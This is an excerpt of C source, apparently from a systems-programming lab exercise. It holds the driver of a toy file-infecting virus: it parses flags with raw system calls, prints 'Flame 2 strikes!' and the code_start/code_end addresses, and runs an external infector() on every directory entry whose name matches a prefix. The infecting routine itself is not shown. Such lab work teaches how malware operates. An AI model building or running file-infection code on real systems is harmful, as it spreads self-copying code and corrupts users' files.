...
extern void infector(char* attachFile);
...
int main (int argc , char* argv[], char* envp[])
{
    ...
    for(i=1; i<argc; i=i+1){
        ...
        if(strcmp(argv[i],"-D")==0){
         ...
         if(strncmp(argv[i],"-a",2)==0){
            isAttach=1;
            indexofAttach=i;
            int descriptorWrite=system_call(4,STDOUT,"-a\n",3);
            if(descriptorWrite==-1 || descriptorWrite==0){
                system_call(1,0x55,dont_care,dont_care);
            }
        }
    ...
    int descriptorFlame=system_call(4,STDOUT,"Flame 2 strikes!\n",17);
    if(descriptorFlame==-1 || descriptorFlame==0){
                system_call(1,0x55,dont_care,dont_care);
            }
...
char* attach;
    if(isAttach){
         int* code_startval=( int)*&code_start;
         int* code_endval=( int)*&code_end;
        char* code_startAdd=itoa(code_startval);
        char* code_endAdd=itoa(code_endval);
        int descriptorAdresses=system_call(4,STDOUT,code_startAdd,strlen(code_startAdd));
            if(descriptorAdresses==-1 || descriptorAdresses==0){
                system_call(1,0x55,dont_care,dont_care);
            }
       descriptorAdresses=system_call(4,STDOUT,"\n",1);
            if(descriptorAdresses==-1 || descriptorAdresses==0){
                system_call(1,0x55,dont_care,dont_care);
            }      
            
    descriptorAdresses=system_call(4,STDOUT,code_endAdd,strlen(code_endAdd));
            if(descriptorAdresses==-1 || descriptorAdresses==0){
                system_call(1,0x55,dont_care,dont_care);
            }  
       descriptorAdresses=system_call(4,STDOUT,"\n",1);
...
char Maxbuf[8192];
    ...
    if(isprefix){
        ...
        if(strncmp(attach,PointerToent->buffer,strlen(attach))==0){
            infection();
            infector(PointerToent->buffer);
            char type= *(Maxbuf+j+PointerToent->len-1);
            char* typename;
            if(type == DT_REG){typename="regular";}
            else if(type == DT_DIR){typename="directory";}                     
